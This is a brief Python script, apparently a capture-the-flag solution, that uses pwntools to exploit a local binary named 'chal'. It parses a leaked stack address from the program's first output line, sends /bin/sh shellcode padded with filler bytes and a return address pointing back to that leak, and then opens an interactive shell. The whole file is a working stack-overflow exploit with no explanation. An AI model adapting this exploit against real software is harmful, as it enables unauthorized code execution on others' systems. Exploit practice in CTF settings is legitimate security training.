from pwn import *
from binascii import *

p = process("./chal")
e = ELF("./chal")
context.binary = e

#gdb.attach(p)
l = p.recvline()
print(l)
start = int(l[len("Let's start at 0x"):-1],16)
print(hex(start))
shellcode = asm(shellcraft.sh())
p.sendline(shellcode + b"\xcc"*(111-len(shellcode))+b"E"+b"a"*8+p64(start))
p.interactive()
